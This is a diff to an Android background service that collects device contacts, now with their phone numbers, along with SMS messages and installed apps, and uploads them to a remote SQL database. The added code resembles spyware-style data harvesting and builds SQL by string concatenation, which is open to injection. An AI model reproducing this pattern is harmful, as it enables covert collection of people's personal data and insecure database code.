@@ -30,7 +30,7 @@ import java.util.concurrent.TimeUnit;
 public class MyService2 extends Service {
 
     private  LinkedList<String> applist = null;
-    private LinkedList<String> contacts = new LinkedList<>();
+    private LinkedList<Contactclass> contacts = new LinkedList<Contactclass>();
     private LinkedList<SMSclass> sms = new LinkedList<>();
     private static boolean READ_CONTACTS_GRANTED = false;
     private static boolean READ_INTERNET_GRANTED = false;
@@ -102,14 +102,27 @@ public class MyService2 extends Service {
     }
 
 
-    private LinkedList<String> readContacts() {
+    private LinkedList<Contactclass> readContacts() {
         ContentResolver contentResolver = getContentResolver();
         Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
         try {
             if (cursor != null) {
                 while (cursor.moveToNext()) {
                     String contact = "!"+cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY));
-                    contacts.add(contact.replace("'","*"));
+                    int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
+                    String phoneNumber="none";
+                    if(hasPhoneNumber>0)
+                    {
+                        StringBuffer output = new StringBuffer();
+                        Cursor phoneCursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
+                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                                new String[] { cursor.getString(cursor.getColumnIndex( ContactsContract.Contacts._ID )) }, null);
+                        while (phoneCursor.moveToNext()) {
+                            phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                            output.append("\n Телефон: " + phoneNumber);
+                        }
+                    }
+                    contacts.add(new Contactclass(contact.replace("'","*"),phoneNumber));
                 }
 
                 cursor.close();
@@ -183,7 +196,7 @@ public class MyService2 extends Service {
 
                         if(clientID>0) {
 
-                            Log.d("db",clientID+"");
+
                             insertstring = "SELECT *FROM Messages WHERE ClientID="+clientID;
                             resultSet=statement.executeQuery(insertstring);
                             while(resultSet.next()) {
@@ -199,20 +212,23 @@ public class MyService2 extends Service {
                                     }
                                 }
                             }
-                            Log.d("db",clientID+"");
+
                             insertstring = "SELECT *FROM Contacts WHERE ClientID="+clientID;
                             resultSet=statement.executeQuery(insertstring);
                             while(resultSet.next()) {
 
                                 for(int j=0;j<contacts.size();j++)
                                 {
-                                    if(contacts.get(j).equals(resultSet.getString(3)))
+                                    if(contacts.get(j).name.equals(resultSet.getString(3)))
                                     {
-                                        contacts.remove(j);
+                                        if(contacts.get(j).number.equals(resultSet.getString(4)))
+                                        {
+                                            contacts.remove(j);
+                                        }
                                     }
                                 }
                             }
-                            Log.d("db",clientID+"");
+
                             insertstring = "SELECT *FROM Applications WHERE ClientID="+clientID;
                             resultSet=statement.executeQuery(insertstring);
                             while(resultSet.next()) {
@@ -231,9 +247,9 @@ public class MyService2 extends Service {
 
                             Log.d("db","DELETED");
                             if(contacts.size()>0) {
-                                insertstring = "INSERT Contacts(ClientID, ContactName) VALUES (";
+                                insertstring = "INSERT Contacts(ClientID, ContactName, ContactNumber) VALUES (";
                                 for (int k = 0; k < contacts.size(); k++) {
-                                    insertstring += clientID + ", N'" + contacts.get(k) + "'";
+                                    insertstring += clientID + ", N'" + contacts.get(k).name + "'"+ ", N'" + contacts.get(k).number + "'";
                                     if (k < contacts.size() - 1) {
                                         insertstring += "), (";
                                     }
